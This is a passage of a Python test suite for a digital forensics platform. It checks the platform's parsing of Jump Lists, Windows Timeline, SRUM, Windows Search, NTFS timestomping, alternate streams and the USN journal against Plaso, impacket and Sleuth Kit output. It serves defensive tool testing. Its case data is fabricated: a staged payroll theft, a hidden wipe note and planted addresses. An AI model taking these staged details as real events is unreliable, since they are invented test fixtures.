    truth = [(r[0], datetime.fromtimestamp(r[1], tz=timezone.utc)) for r in con.execute('SELECT ActivityType, StartTime FROM Activity ORDER BY StartTime, ETag')]
    ops = con.execute('SELECT OperationType, ActivityType, StartTime FROM ActivityOperation').fetchall()
    con.close()
    acts = rows('TIMELINE_ACTIVITY')['data']
    ours = sorted((a['activity_type'], iso(a['start_time'])) for a in acts if a['table'] == 'Activity')
    check(f'the Timeline holds the {len(truth)} activities sqlite3 reads, with their types and start times, and the pending deletion',
          ours == sorted(truth) and [(a['operation_type'], a['activity_type']) for a in acts if a['table'] == 'ActivityOperation'] == [(o[0], o[1]) for o in ops] == [(3, 5)],
          (ours, truth, ops))
    note_ = next((a for a in acts if a['activity_type'] == 5 and a['display_text'] == 'payroll-export.csv'), {})
    used = next((a for a in acts if a['activity_type'] == 6 and 'notepad' in (a['app'] or '').lower()), {})
    clip = next((a for a in acts if a['activity_type'] == 10), {})
    sd = next((a for a in acts if a['activity_type'] == 5 and 'SecureDelete' in (a['app'] or '')), {})
    bam = next((b for b in get(f'/api/forensics/registry?case_id={A}&type=BAM_ENTRY', inv).json['data'] if 'SecureDelete' in b['path']), {})
    check('Notepad opened E:\\payroll-export.csv at 14:14:06 and was in use for 95 seconds; the path was copied to the clipboard at 14:13:30',
          note_.get('app') == 'C:\\Windows\\System32\\notepad.exe' and note_.get('description') == 'E:\\payroll-export.csv'
          and iso(note_.get('start_time')) == utc(2026, 9, 1, 14, 14, 6) and used.get('duration_seconds') == 95
          and iso(used.get('end_time')) == utc(2026, 9, 1, 14, 15, 41) and clip.get('clipboard_text') == 'E:\\payroll-export.csv'
          and clip.get('app') == 'C:\\Windows\\explorer.exe', (note_, used, clip))
    check('SecureDelete.exe started at 14:18:31, the last run BAM records for it',
          iso(sd.get('start_time')) == iso(bam.get('last_run')) == utc(2026, 9, 1, 14, 18, 31), (sd, bam))
    gone = next((a for a in acts if a['table'] == 'ActivityOperation'), {})
    fs_shot = get(f'/api/forensics/evidence/{E}/files?q=payroll-screenshot&limit=10', inv).json
    check('the Timeline entry for payroll-screenshot.png was deleted by the user, and the picture is not on the disk',
          gone.get('operation_label') == 'deleted by the user' and gone.get('display_text') == 'payroll-screenshot.png'
          and gone.get('app') == 'Microsoft.Windows.Photos_8wekyb3d8bbwe!App' and fs_shot.get('total', 0) == 0, (gone, fs_shot.get('total')))

    # Thumbnails, against the PNGs found in the cache file and decoded by Pillow.
    from PIL import Image
    thumbs = sorted(rows('THUMBNAIL')['data'], key=lambda t: t['offset'])
    pngs = _pngs(icat_bytes(THUMBCACHE))
    served = [get(f"/api/forensics/artifacts/{t['artifact_id']}/raw", inv) for t in thumbs]
    sizes = [Image.open(io.BytesIO(s.body)).size for s in served if s.status == 200]
    check('the two thumbnails (the reserved entry without a picture is skipped) equal the PNGs in the cache file, byte for byte',
          [t['entry_hash'] for t in thumbs] == ['9f3a6c21e4d07b58', '41c7d2e09b6f3a15']
          and [hashlib.sha256(p).hexdigest() for p in pngs] == [t['sha256'] for t in thumbs] == [hashlib.sha256(s.body).hexdigest() for s in served],
          ([t['entry_hash'] for t in thumbs], len(pngs)))
    check("Pillow decodes each thumbnail at the size its cache entry records (the wiped screenshot's: 256×144)",
          sizes == [(t['width'], t['height']) for t in thumbs] == [(256, 144), (48, 32)], sizes)
    db = mongo()
    check('viewing a thumbnail is recorded in the audit log, and it is served as a sandboxed attachment',
          db.audit_logs.find_one({'action': 'FILE_CONTENT_VIEWED', 'resource_id': thumbs[0]['artifact_id']})
          and (lambda h: h.get('content-security-policy', '').startswith('sandbox') and h.get('x-content-type-options') == 'nosniff')(
              {k.lower(): v for k, v in served[0].headers.items()}), served[0].headers)

    # Timeline events, filters, search, tags, counts and access.
    events = [e for e in get(f'/api/forensics/timeline?case_id={A}&limit=2000', inv).json['data'] if e.get('evidence_id') == E]
    opened = sorted(iso(e['timestamp']) for e in events if e['type'] == 'JUMPLIST_OPENED')
    check('the timeline gains the five Jump List uses and the six Timeline activities',
          len(opened) == 5 and utc(2026, 9, 1, 14, 14, 6) in opened and sum(e['type'] == 'TIMELINE_ACTIVITY' for e in events) == 6
          and any(e['description'].startswith('Timeline entry deleted by the user') for e in events), opened)
    check('records can be searched', rows('JUMPLIST_ENTRY', '&search=payroll')['total'] == 1 and rows('TIMELINE_ACTIVITY', '&search=payroll')['total'] == 3
          and get(f'/api/forensics/search?case_id={A}&q=payroll-screenshot', inv).json['totals'].get('useractivity') == 1)
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    check('the overview counts Jump List items, Timeline activities and thumbnails (8, 6, 2)',
          (ov.get('jumplist_entries'), ov.get('timeline_activities'), ov.get('thumbnails')) == (8, 6, 2), ov)
    check('a bad type is refused (400); another investigator gets 404 for the records and the thumbnails',
          get(f'/api/forensics/user-activity?case_id={A}&type=NOPE', inv).status == 400
          and get(f'/api/forensics/user-activity?case_id={A}&type=THUMBNAIL', C['INV2']).status == 404
          and get(f"/api/forensics/artifacts/{thumbs[0]['artifact_id']}/raw", C['INV2']).status == 404)
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'WINDOWS', 'item_id': pay['_id'], 'label': 'EVIDENCE', 'note': 'opened from E:'})
    j = _analyse(inv, E, {'modules': ['user_activity']})
    runs = sorted(p.name for p in (Path('/app/storage/analysis/thumbs') / E).iterdir())
    check('a Jump List item can be tagged and the tag follows it when the module runs again; old thumbnails are replaced',
          t.status == 200 and j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0} and len(runs) == 1
          and rows('THUMBNAIL')['total'] == 2, (t, j.get('result', {}).get('summary', {}).get('tags'), runs))
    req('DELETE', f"/api/tags/{t.json['tag_id']}", inv)


@section('12j Real Jump Lists, Timeline, SRUM and Windows Search (Plaso samples on a disk, vs Plaso, impacket and sqlite3)')
def t_user_activity_samples():
    if not SAMPLES_IMG.is_file():
        note('real-sample disk', 'storage/test-images/dfip-samples-disk.dd is missing: run scripts/test-image/fetch-samples.sh')
        return
    inv = C['INVESTIGATOR']
    case = post('/api/cases', inv, {'name': 'Real Windows samples', 'priority': 'LOW'}).json['case_id']
    ev = upload(inv, case, SAMPLES_IMG.read_bytes(), 'samples.dd').json['evidence_id']
    C['SAMPLES_EV'] = ev
    j = _analyse(inv, ev, {'modules': ['user_activity']})
    counts = j.get('result', {}).get('summary', {}).get('counts', {})
    check('the module reads the real files on the samples disk', j['status'] == 'COMPLETED' and counts.get('srum_network_records') == 1840
          and counts.get('search_index_entries') == 322, counts)
    db = mongo()
    of = lambda t, q=None: list(db.forensic_artifacts.find(dict({'evidence_id': ev, 'type': t}, **(q or {}))))

    # Jump Lists: the values Plaso's own tests expect for these files.
    jl = of('JUMPLIST_ENTRY')
    e7 = next((x for x in jl if x['source_path'].endswith('1b4dd67f29cb1962.automaticDestinations-ms') and x.get('entry_number') == 7), {})
    check('Windows 7 Jump List (DestList version 1): 7 entries; entry 7 is C:\\Users\\bperry\\Downloads with the values Plaso expects',
          sum(x['source_path'].endswith('1b4dd67f29cb1962.automaticDestinations-ms') for x in jl) == 7 and e7.get('destlist_path') == 'C:\\Users\\bperry\\Downloads'
          and e7.get('hostname') == 'student-pc1' and e7.get('droid_volume_id') == 'fb6af886-05d7-402d-9741-d1ee9e64c41f'
          and e7.get('droid_file_id') == '9b1ce584-4a4c-11e5-b5c9-080027ac3d7f' and e7.get('pinned') is False
          and e7.get('last_used') == utc(2015, 8, 29, 15, 32, 44, 34000), e7)  # stored to the millisecond (Plaso: .0343008)
    v3 = next((x for x in jl if x['source_path'].endswith('9d1f905ce5044aee.automaticDestinations-ms') and x.get('entry_number') == 2), {})
    check('Windows 10 Jump List (DestList version 3): entry 2 is the support.microsoft.com page used at 13:08:08.2475 on 17 January 2016',
          v3.get('destlist_path') == 'http://support.microsoft.com/kb/3124263' and v3.get('last_used') == utc(2016, 1, 17, 13, 8, 8, 247000)
          and v3.get('access_count') == 1 and v3.get('format_version') == 3, v3)
    disp = next((x for x in jl if ((x.get('lnk') or {}).get('arguments') or '').endswith('/name Microsoft.Display')), {})
    check('CustomDestinations: the Microsoft.Display task link with the description and times Plaso expects',
          (disp.get('lnk') or {}).get('target_path') == 'C:\\Windows\\System32\\GettingStarted.exe' and disp.get('category') == 'Tasks'
          and disp['lnk'].get('description') == '@%systemroot%\\system32\\oobefldr.dll,-1262'
          and iso(disp['lnk'].get('target_modified')) == utc(2009, 7, 14, 1, 39, 11, 388000), disp.get('lnk'))
    cats = {x['category'] for x in jl if x['source_path'].endswith('368d807282ccde9d.customDestinations-ms')}
    check('a CustomDestinations file with several categories is read through to the end', cats == {'My Category 1', 'Tasks', 'My Category 2'}, cats)

    # The Windows Timeline: Plaso's expected values, and sqlite3.
    acts = of('TIMELINE_ACTIVITY')
    con = sqlite3.connect(f"file:{SAMPLES / 'plaso' / 'windows' / 'ActivitiesCache.db'}?mode=ro&immutable=1", uri=True)
    n_db = con.execute('SELECT count(*) FROM Activity').fetchone()[0] + con.execute('SELECT count(*) FROM ActivityOperation').fetchone()[0]
    con.close()
    py = [a for a in acts if a.get('start_time') == utc(2018, 8, 3, 11, 29) and a.get('duration_seconds') == 9]
    od = [a for a in acts if a.get('app') == 'Microsoft.SkyDrive.Desktop' and a.get('start_time') == utc(2018, 7, 25, 12, 4, 48)
          and a.get('app_display_name') == 'OneDrive']
    check(f'Windows Timeline: all {n_db} activities sqlite3 counts (Plaso reads 112); python.exe in use 9 s at 11:29:00 on 3 August 2018; OneDrive opened',
          len(acts) == n_db == 112 and len(py) == 1 and py[0]['app'].lower() == 'c:\\python34\\python.exe'
          and py[0]['reporting_app'] == 'ShellActivityMonitor' and len(od) == 1, (len(acts), [(a['app'], a['start_time']) for a in py]))

    # SRUM, against impacket's ESE reader.
    from impacket.ese import ESENT_DB
    srudb = ESENT_DB(str(SAMPLES / 'plaso' / 'SRUDB.dat'))
    cur = srudb.openTable('SruDbIdMapTable')
    names = {}
    while (r := srudb.getNextRow(cur)) is not None:
        if r[b'IdType'] in (0, 1, 2) and r[b'IdBlob']:
            names[r[b'IdIndex']] = bytes.fromhex(r[b'IdBlob'].decode()).decode('utf-16-le').rstrip('\0')
    cur = srudb.openTable('{973F5D5C-1D90-4944-BE8E-24B94231A174}')
    truth = {}
    while (r := srudb.getNextRow(cur)) is not None:
        when = datetime(1899, 12, 30, tzinfo=timezone.utc) + timedelta(days=struct.unpack('<d', struct.pack('<q', r[b'TimeStamp']))[0])
        truth[r[b'AutoIncId']] = (when, names.get(r[b'AppId']), r[b'BytesSent'], r[b'BytesRecvd'])
    ours = {x['record']: (x['time'], x['app'], x['bytes_sent'], x['bytes_received']) for x in of('SRUM_NETWORK')}
    bad = [k for k in truth if k not in ours or abs(ours[k][0] - truth[k][0]) > timedelta(milliseconds=1)
           or (ours[k][1] or '') != re.sub(r'^\\Device\\HarddiskVolume\d+', '', truth[k][1] or '', flags=re.I) or ours[k][2:] != truth[k][2:]]
    check(f'SRUM network usage: all {len(truth)} records equal impacket (time, application, bytes sent and received)',
          len(ours) == len(truth) == 1840 and not bad, bad[:5])
    top = get(f'/api/forensics/user-activity/network?case_id={case}', inv).json['data']
    expect_total = sum(v[2] for v in truth.values())
    check('the network usage per application adds up to the bytes impacket reads', sum(x['bytes_sent'] for x in top) == expect_total and top[0]['bytes_sent'] >= top[-1]['bytes_sent'],
          (sum(x['bytes_sent'] for x in top), expect_total))
    check('application usage and connections are read too (16,183 and 260 records)',
          len(of('SRUM_APP_USAGE')) == 16183 and len(of('SRUM_CONNECTIVITY')) == 260)

    # Windows Search, against impacket (it reads numbers and times; the compressed text columns are decoded by libesedb only).
    edb = ESENT_DB(str(SAMPLES / 'plaso' / 'Windows.edb'))
    cur = edb.openTable('SystemIndex_0A')
    rows_ = {}
    while (r := edb.getNextRow(cur)) is not None:
        hexval = lambda k: int(r[k].decode(), 16) if r.get(k) and r[k] != b'2a2a2a2a2a2a2a2a' else None
        rows_[r[b'DocID']] = (hexval(b'System_Size'), hexval(b'System_DateModified'), r[b'System_ThumbnailCacheId'].decode() if r.get(b'System_ThumbnailCacheId') else None)
    entries = of('SEARCH_INDEX_ENTRY')
    # To the millisecond; a placeholder before 1980 (some items have FILETIME 1) is no time at all.
    ft = lambda n: (lambda t: t if t.year >= 1980 else None)(datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=n // 10 // 1000 * 1000)) if n else None
    bad = [x['work_id'] for x in entries if x['work_id'] not in rows_ or x.get('size') != rows_[x['work_id']][0]
           or x.get('modified') != ft(rows_[x['work_id']][1]) or x.get('thumbnail_cache_id') != rows_[x['work_id']][2]]
    check(f'Windows Search: all {len(rows_)} items equal impacket (document ID, size, modification time, thumbnail cache ID)',
          len(entries) == len(rows_) == 322 and not bad, bad[:5])
    files = [x for x in entries if x.get('extension')]
    check('every indexed path is its folder and name joined (the decompressed text columns agree with each other)',
          files and all(x['path'] == (x['folder'].rstrip('\\') + '\\' + x['name']) for x in files),
          [(x['path'], x['folder'], x['name']) for x in files if x['path'] != (x['folder'].rstrip('\\') + '\\' + x['name'])][:3])
    summ = next((x for x in entries if (x.get('path') or '').endswith('Default Programs.lnk')), {})
    check('summaries are decoded (Windows Search obfuscates them): "Choose which programs you want Windows to use..."',
          (summ.get('summary') or '').startswith('Choose which programs you want Windows to use for activities like web browsing')
          and sum(1 for x in entries if x.get('summary')) == 78, summ.get('summary'))
    on_disk = {f['path'] for f in db.fs_entries.find({'evidence_id': ev, 'deleted': False, 'is_virtual': False}, {'path': 1})}
    c_drive = [x for x in entries if (x.get('path') or '').upper().startswith('C:\\')]
    wrong = [(x['path'], x['file_state']) for x in c_drive
             if x['file_state'] != ('on disk' if '/' + x['path'][3:].replace('\\', '/') in on_disk else 'not on the disk')]
    check('each indexed C: path is matched with the disk: the few folders the samples disk has (C:\\Users, C:\\ProgramData...) are "on disk", '
          'the rest "not on the disk"', c_drive and not wrong and any(x['file_state'] == 'on disk' for x in c_drive), wrong[:5])


NTFS_IMG = Path('/testdata/dfip-ntfs-disk.dd')
NTFS_MANIFEST = Path('/testdata/dfip-ntfs-disk.manifest.json')


def _istat_times(img, offset, inode):
    """$STANDARD_INFORMATION and $FILE_NAME times from istat, to the millisecond (as DFIP stores them)."""
    text = sh('istat', '-o', str(offset), str(img), str(inode)).stdout.decode()
    out, part = {}, None
    for line in text.splitlines():
        if line.startswith('$STANDARD_INFORMATION'):
            part = 'si'
        elif line.startswith('$FILE_NAME'):
            part = 'fn'
        elif line.startswith('Attributes:'):
            part = None
        m = re.match(r'^(Created|File Modified|MFT Modified|Accessed):\s+(\S+ \S+?)(\d{0,3})\d* \(UTC\)', line)
        if part and m:
            key = {'Created': 'created', 'File Modified': 'modified', 'MFT Modified': 'changed', 'Accessed': 'accessed'}[m.group(1)]
            out[f'{part}_{key}'] = datetime.fromisoformat((m.group(2) + m.group(3)).rstrip('.')).replace(tzinfo=timezone.utc)
    return out


def _usnjls(img, offset):
    """usnjls records: (entry, sequence, parent entry, parent sequence, time to the ms, reasons, name)."""
    out = []
    for line in sh('usnjls', '-o', str(offset), str(img)).stdout.decode().splitlines():
        ref, parent, ts, reasons, name = line.split('\t')
        sec, _, nsec = ts.partition('.')  # usnjls prints the fraction as nanoseconds, without leading zeros
        when = datetime.fromtimestamp(int(sec), tz=timezone.utc) + timedelta(milliseconds=int(nsec or 0) // 1_000_000)
        e, s = ref.split('-')
        pe, ps = parent.split('-')
        out.append((int(e), int(s), int(pe), int(ps), when, reasons.split(), name))
    return out


@section('12k NTFS: timestomping, alternate data streams and the USN journal (an NTFS disk vs istat, icat, usnjls and the generator)')
def t_ntfs():
    if not NTFS_IMG.is_file():
        check('the NTFS test disk exists (scripts/test-image/make-ntfs-image.sh)', False)
        return
    inv = C['INVESTIGATOR']
    truth = json.loads(NTFS_MANIFEST.read_text())
    case = post('/api/cases', inv, {'name': 'Office desktop (NTFS)', 'priority': 'HIGH'}).json['case_id']
    ev = upload(inv, case, NTFS_IMG.read_bytes(), 'alice-desktop.dd').json['evidence_id']
    j = _analyse(inv, ev)
    counts = j.get('result', {}).get('summary', {}).get('counts', {})
    C['NTFS_CASE'], C['NTFS_E'] = case, ev
    check('the standard analysis reads the NTFS volume: 1 volume, 20 journal records, 3 streams, 1 file with altered times',
          j['status'] == 'COMPLETED' and (counts.get('ntfs_volumes'), counts.get('usn_records'), counts.get('alternate_streams'),
                                          counts.get('timestomp_suspects'), counts.get('timestomp_possible')) == (1, 20, 3, 1, 0), counts)
    vols = get(f'/api/forensics/ntfs/volumes?case_id={case}', inv).json['data']
    serial = re.search(r'Volume Serial Number: (\S+)', sh('fsstat', '-o', '2048', str(NTFS_IMG)).stdout.decode()).group(1)
    check('the volume serial number and label equal fsstat', vols and vols[0]['serial_number'] == serial.upper() and vols[0]['name'] == 'ALICE-DATA',
          (vols, serial))

    # Timestomping, against istat.
    ts = get(f'/api/forensics/ntfs/timestomp?case_id={case}', inv).json['data']
    stomped = truth['timestomped']
    t = ts[0] if ts else {}
    ist = _istat_times(NTFS_IMG, 2048, 73)
    check('only budget-2025.txt is flagged (strong): $SI says 2 March 2024 09:00:00, $FN says it was created 1 September 2026',
          [x['path'] for x in ts] == [stomped['path']] and t['level'] == 'strong' and iso(t['si_created']) == iso(stomped['si'])
          and iso(t['fn_created']).date().isoformat() == '2026-09-01', ts)
    check("its $SI and $FN times equal istat's, to the millisecond",
          all(iso(t[k]) == ist[k] for k in ('si_created', 'si_modified', 'si_changed', 'si_accessed', 'fn_created', 'fn_modified')), (t, ist))

    # Alternate data streams, against icat.
    streams = {s['path']: s for s in get(f'/api/forensics/ntfs/streams?case_id={case}', inv).json['data']}
    check("the three streams are found (the journal's own $J and $Max are not listed)", set(streams) == set(truth['streams']), sorted(streams))
    good = []
    for path, text in truth['streams'].items():
        s = streams.get(path, {})
        data = sh('icat', '-o', '2048', str(NTFS_IMG), s.get('inode') or '0').stdout
        good.append(data == text.encode() and s.get('sha256') == hashlib.sha256(data).hexdigest() and s.get('text') == text)
    check('each stream equals icat byte for byte (SHA-256 and content)', all(good), good)
    sd = streams.get('/Users/alice/Downloads/SecureDelete.exe:Zone.Identifier', {})
    check('SecureDelete.exe was downloaded from the internet (zone 3), from the page Chrome recorded',
          (sd.get('zone') or {}).get('ZoneName') == 'Internet' and sd['zone'].get('ReferrerUrl') == 'https://tools.example.org/securedelete'
          and sd['zone'].get('HostUrl') == 'https://tools.example.org/securedelete/SecureDelete.exe', sd.get('zone'))
    hidden = streams.get('/Users/alice/Documents/notes.txt:hidden.txt', {})
    check('the note hidden in notes.txt:hidden.txt is shown, and has no stream kind (it is not a stream Windows writes)',
          hidden.get('text') == 'Copy the payroll to the SanDisk, then wipe it.\r\n' and hidden.get('kind') is None, hidden)
    view = get(f"/api/forensics/evidence/{ev}/preview?inode={hidden.get('inode')}&offset=2048", inv).json or {}
    check('the hidden stream opens in the file viewer', 'Copy the payroll to the SanDisk' in (view.get('text') or ''), view)
    downloads = get(f'/api/forensics/ntfs/streams?case_id={case}&downloaded=true', inv).json['total']
    check('downloaded files can be listed on their own (2)', downloads == 2, downloads)

    # The USN journal, against usnjls and the generator.
    recs = get(f'/api/forensics/ntfs/usn?case_id={case}&limit=1000', inv).json['data']
    ours = [(x['entry'], x['sequence'], x['parent_entry'], x['parent_sequence'], iso(x['time']), x['reasons'], x['name']) for x in recs]
    theirs = _usnjls(NTFS_IMG, 2048)
    planned = [(r['entry'], 1, r['parent_entry'], 1, iso(r['time']).replace(microsecond=iso(r['time']).microsecond // 1000 * 1000),
                [n for b, n in USN_REASONS if r['reason_flags'] & b], r['name']) for r in truth['usn']]
    check(f'all {len(theirs)} journal records equal usnjls and the generator (file and folder references, time, reasons, name)',
          len(ours) == 20 and ours == [(a, b, c, d, e, sorted(f, key=_reason_order), g) for a, b, c, d, e, f, g in theirs] == planned,
          (ours[:2], theirs[:2], planned[:2]))
    paths = {x['usn']: x['path'] for x in recs}
    check('each record has its full path, through its folder\'s MFT entry (the wiped file too, under both its names)',
          paths[truth['usn'][7]['usn']] == '/Users/alice/Documents/payroll-copy.csv' and paths[truth['usn'][-1]['usn']] == '/Users/alice/Documents/AAAAAAAA.AAA'
          and all(paths.values()), paths)
    deleted = [x for x in sh('fls', '-r', '-p', '-o', '2048', str(NTFS_IMG)).stdout.decode().splitlines() if '*' in x and 'AAAAAAAA.AAA' in x]
    check('the wiped file is deleted in the MFT (fls), its entry the one the journal names', deleted and deleted[0].split()[2].startswith(f"{truth['wiped']['entry']}-"),
          deleted)
    q = lambda extra: get(f'/api/forensics/ntfs/usn?case_id={case}{extra}', inv)
    check('filters: a reason, closing records only, a name, an MFT entry; a bad reason is refused (400)',
          q('&reason=FILE_DELETE').json['total'] == 1 and q('&closing=true').json['total'] == sum(1 for r in truth['usn'] if r['reason_flags'] & 0x80000000)
          and q('&search=payroll-copy').json['total'] == 3 and q(f"&entry={truth['wiped']['entry']}").json['total'] == 8
          and q('&reason=NOPE').status == 400)

    # The timeline and the rest.
    events = [e for e in get(f'/api/forensics/timeline?case_id={case}&limit=2000', inv).json['data'] if e.get('source') == 'NTFS']
    by = lambda kind: [(iso(e['timestamp']), e['description']) for e in events if e['type'] == kind]
    check('the timeline shows the wipe: renamed (was payroll-copy.csv), overwritten, deleted; and the time change on budget-2025.txt',
          any(d == 'File renamed (USN journal): /Users/alice/Documents/AAAAAAAA.AAA, was payroll-copy.csv' for _, d in by('USN_CHANGE'))
          and any(d.startswith('File deleted (USN journal): /Users/alice/Documents/AAAAAAAA.AAA') for _, d in by('USN_CHANGE'))
          and any(d.startswith('File overwritten') for _, d in by('USN_CHANGE'))
          and (utc(2026, 9, 1, 14, 16, 40, 250000), 'File times or attributes changed (USN journal): /Users/alice/Documents/budget-2025.txt') in by('USN_CHANGE'),
          by('USN_CHANGE'))
    check('...the altered times at the moment they were changed, and the two downloads with where they came from',
          [t_ for t_, _ in by('TIMESTOMP_SUSPECT')] == [ist['si_changed']] and len(by('FILE_DOWNLOADED')) == 2
          and any('https://tools.example.org/securedelete/SecureDelete.exe' in d for _, d in by('FILE_DOWNLOADED')), events[:3])
    s = get(f'/api/forensics/search?case_id={case}&q=AAAAAAAA', inv).json['totals']
    check('keyword search finds journal records', s.get('usn') == 5, s)
    ov = get(f'/api/cases/{case}/overview', inv).json['counts']
    check('the overview counts altered files, streams and journal records', (ov.get('timestomp_suspects'), ov.get('alternate_streams'), ov.get('usn_records')) == (1, 3, 20), ov)
    check('another investigator gets 404', all(get(f'/api/forensics/ntfs/{p}?case_id={case}', C['INV2']).status == 404
                                                for p in ('volumes', 'timestomp', 'streams', 'usn')))
    tag = post('/api/tags', inv, {'case_id': case, 'item_type': 'USN', 'item_id': recs[-1]['_id'], 'label': 'EVIDENCE', 'note': 'wiped'})
    j2 = _analyse(inv, ev, {'modules': ['ntfs']})
    check('a journal record can be tagged, and the tag follows it when the volume is read again',
          tag.status == 200 and j2['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0}, (tag, j2.get('result', {}).get('summary', {}).get('tags')))
    r = post(f'/api/reports?case_id={case}', inv)
    if r.status == 200:
        (OUT / 'report-ntfs.pdf').write_bytes(get(f"/api/reports/{r.json['report_id']}/download", inv).body)
    check('a report of the NTFS case is generated', r.status == 200, r)


USN_REASONS = [(0x00000001, 'DATA_OVERWRITE'), (0x00000002, 'DATA_EXTEND'), (0x00000004, 'DATA_TRUNCATION'), (0x00000010, 'NAMED_DATA_OVERWRITE'),
               (0x00000020, 'NAMED_DATA_EXTEND'), (0x00000040, 'NAMED_DATA_TRUNCATION'), (0x00000100, 'FILE_CREATE'), (0x00000200, 'FILE_DELETE'),
               (0x00000400, 'EA_CHANGE'), (0x00000800, 'SECURITY_CHANGE'), (0x00001000, 'RENAME_OLD_NAME'), (0x00002000, 'RENAME_NEW_NAME'),
               (0x00004000, 'INDEXABLE_CHANGE'), (0x00008000, 'BASIC_INFO_CHANGE'), (0x00010000, 'HARD_LINK_CHANGE'),
               (0x00020000, 'COMPRESSION_CHANGE'), (0x00040000, 'ENCRYPTION_CHANGE'), (0x00080000, 'OBJECT_ID_CHANGE'),
               (0x00100000, 'REPARSE_POINT_CHANGE'), (0x00200000, 'STREAM_CHANGE'), (0x00400000, 'TRANSACTED_CHANGE'),
               (0x00800000, 'INTEGRITY_CHANGE'), (0x80000000, 'CLOSE')]  # [MS-FSCC] USN_RECORD reason codes
_reason_order = {n: i for i, (_, n) in enumerate(USN_REASONS)}.get


@section('12l Real NTFS samples (dfVFS ntfs.raw vs fls and istat; Plaso\'s $MFT and USN journal vs Plaso and usnjls)')
def t_ntfs_samples():
    sys.path.insert(0, '/app')
    from app.forensic import ntfs
    raw = sample('dfvfs', 'ntfs.raw')
    if raw:
        vol, f = ntfs.open_volume(raw, 0)
        ours = {('/' + ntfs.windows_path(e['path_hint']).lstrip('/')): e for e in ntfs.entries(vol) if e['path_hint'] and not e['path_hint'].startswith('\\$')}
        fls = {'/' + line.split('\t', 1)[1]: line.split()[1].split('-')[0].rstrip(':')
               for line in sh('fls', '-r', '-p', str(raw)).stdout.decode().splitlines() if '\t' in line and ':' not in line.split('\t', 1)[1]
               and not line.split('\t', 1)[1].startswith('$') and '*' not in line}
        check(f"dfVFS ntfs.raw: every file and folder ({len(fls)}) with the MFT entry fls gives", {p: str(e['entry']) for p, e in ours.items()} == fls,
              (sorted(ours), fls))
        ist = _istat_times(raw, 0, int(fls.get('/passwords.txt', 0)))
        pw = ours.get('/passwords.txt', {})
        check("dfVFS ntfs.raw: passwords.txt's $SI and $FN times equal istat's",
              pw and pw['si']['created'].replace(microsecond=pw['si']['created'].microsecond // 1000 * 1000) == ist['si_created']
              and pw['fn']['created'].replace(microsecond=pw['fn']['created'].microsecond // 1000 * 1000) == ist['fn_created'], (pw.get('si'), ist))
        vol.close()
        f.close()
    mft = sample('plaso', 'MFT')
    if mft:
        import pyfsntfs
        m = pyfsntfs.mft_metadata_file()
        m.open(str(mft))
        entries = list(ntfs.entries(m, first=0))
        sam = next((e for e in entries if e['path_hint'] == '\\WINDOWS\\system32\\config\\SAM'), {})
        caja = next((e for e in entries if e['name'] == 'CAJA1S19.js'), {})
        orphan = next((e for e in entries if e['path_hint'] == '$Orphan\\session\\menu.text.css'), {})
        expect = lambda e, when: e and e['fn']['created'] == when
        check("Plaso's real Windows XP $MFT: SAM, the deleted CAJA1S19.js and the orphaned menu.text.css with the paths and times Plaso expects",
              expect(sam, utc(2007, 6, 30, 12, 58, 50, 274054)) and expect(caja, utc(2009, 1, 14, 3, 38, 58, 586999)) and caja['allocated'] is False
              and caja['path_hint'].endswith('Content.IE5\\9EUWFPZ1\\CAJA1S19.js') and expect(orphan, utc(2009, 1, 14, 21, 7, 11, 572185)),
              (sam.get('path_hint'), caja.get('path_hint'), orphan.get('path_hint')))
        flagged = [e['path_hint'] for e in entries if ntfs.timestomp_reasons(e['si_raw'], e['fn'], e['path_hint'])[0]]
        check(f'...and none of its {len(entries):,} entries is flagged as timestomped (Windows installation times are not mistaken for it)',
              not flagged, flagged[:5])
    qcow = sample('plaso', 'usnjrnl.qcow2')
    if qcow:
        import pyqcow
        q = pyqcow.file()
        q.open(str(qcow))
        local = Path(tempfile.mkdtemp()) / 'usnjrnl.dd'
        with local.open('wb') as out:
            size, pos = q.get_media_size(), 0
            while pos < size:
                out.write(q.read_buffer_at_offset(min(16 << 20, size - pos), pos))
                pos += 16 << 20
        q.close()
        vol, f = ntfs.open_volume(local, 63 * 512)
        recs = list(ntfs.usn_records(vol))
        vol.close()
        f.close()
        first = recs[0] if recs else {}
        check("Plaso's USN journal sample: 19 records; the first creates \"Nieuw - Tekstdocument.txt\" (entry 30-1 in folder 5-5) "
              'at 21:15:27.2031250 on 30 November 2015, as Plaso expects',
              len(recs) == 19 and (first['name'], first['entry'], first['sequence'], first['parent_entry'], first['parent_sequence'], first['reason_flags'],
                                   first['time_raw']) == ('Nieuw - Tekstdocument.txt', 30, 1, 5, 5, 0x100, 130933917272031250), first)
        theirs = _usnjls(local, 63)
        ours = [(r['entry'], r['sequence'], r['parent_entry'], r['parent_sequence'],
                 r['time'].replace(microsecond=r['time'].microsecond // 1000 * 1000), sorted(r['reasons'], key=_reason_order), r['name']) for r in recs]
        check(f'...and its first {len(theirs)} records equal usnjls (which stops at the first record that crosses a 512-byte cluster)',
              len(theirs) == 11 and ours[:len(theirs)] == [(a, b, c, d, e, sorted(f_, key=_reason_order), g) for a, b, c, d, e, f_, g in theirs],
              (ours[:2], theirs[:2]))
        local.unlink()


# Phase 9 ground truth: what make_artifacts.py put in alice's profiles (its constants of the same names).
ALICE = '/Users/alice/AppData'
TB = f'{ALICE}/Roaming/Thunderbird/Profiles/q7w1.default-release/ImapMail/imap.corp.example'
EMAILED_PAYROLL = f'{TB}/Sent!/message 1/payroll-export.csv'  # the attachment, as a file-index member of the Sent folder file
# Values found data must report from the Phase 9 files besides the earlier ones (contacts file and Word documents). Message-ID and
# Content-ID headers have the form of an address, so the mailboxes' IDs are found as addresses too.
PLANTED_EMAILS = {'zoe.martin@example.org', 'alice.personal@example.net', 'finance.team@example.com', 'alice.private@mailbox.example', 'alice@corp.example',
                  'payroll@corp.example', 'dmitri.k@rivalcorp.example', 'logo@corp.example',
                  'a8e2f5c1-77d0-4b8e-9f31-5c2d7e10b4a6@corp.example', '5d0b8a3e-1f9c-4a27-8e64-b3f2c9d0e715@rivalcorp.example',
                  '7f3c2a10-5b1e-4c55-9d1a-2f0d5e6a7b81@corp.example', 'c19e0b7d-2a44-4e0f-bb61-0f6d2e9a1c33@corp.example'}
PLANTED_URLS = {'https://filetransfer.example.net/', 'https://filetransfer.example.net/login', 'https://filetransfer.example.net/session',
